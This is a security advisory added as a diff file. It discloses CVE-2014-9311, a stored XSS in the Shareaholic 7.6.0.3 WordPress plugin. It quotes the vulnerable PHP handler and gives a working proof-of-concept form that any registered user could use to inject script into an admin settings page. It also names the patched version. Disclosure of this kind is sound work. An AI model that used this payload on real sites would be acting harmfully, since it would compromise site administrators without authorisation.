@@ -1,0 +1,67 @@
+# Exploit Title: Shareaholic 7.6.0.3 XSS
+# Date: 10-11-2014
+# Software Link: https://wordpress.org/plugins/shareaholic/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# CVE: CVE-2014-9311
+# Category: webapps
+
+1. Description
+
+ShareaholicAdmin::add_location is accessible for every registered user.
+
+File: shareaholic\shareaholic.php
+
+add_action('wp_ajax_shareaholic_add_location',  array('ShareaholicAdmin', 'add_location'));
+
+
+$_POST['location'] is not escaped.
+
+File: shareaholic\admin.php
+
+public static function add_location() {
+	$location = $_POST['location'];
+	$app_name = $location['app_name'];
+	ShareaholicUtilities::update_options(array(
+	  'location_name_ids' => array(
+	    $app_name => array(
+	      $location['name'] => $location['id']
+	    ),
+	  ),
+	  $app_name => array(
+	    $location['name'] => 'on'
+	  )
+	));
+
+	echo json_encode(array(
+	  'status' => "successfully created a new {$location['app_name']} location",
+	  'id' => $location['id']
+	));
+
+	die();
+}
+
+http://security.szurek.pl/shareaholic-7603-xss.html
+
+2. Proof of Concept
+
+Login as regular user (created using wp-login.php?action=register) then:
+
+<form method="post" action="http://wordpress-install/wp-admin/admin-ajax.php">
+    <input type="hidden" name="action" value="shareaholic_add_location">
+    <input type="hidden" name="location[app_name]" value="recommendations">
+    <input type="hidden" name="location[name]" value="post_below_content">
+    XSS: <input type="text" name="location[id]" value="'><script>alert(String.fromCharCode(88,83,83));</script>">
+    <input type="submit" value="Hack!">
+</form>
+
+XSS will be visible for admin:
+
+http://wordpress-install/wp-admin/admin.php?page=shareaholic-settings
+  
+3. Solution:
+  
+Update to version 7.6.1.0
+https://downloads.wordpress.org/plugin/shareaholic.7.6.1.0.zip
+https://blog.shareaholic.com/security-update-shareaholic-wordpress-plugin/
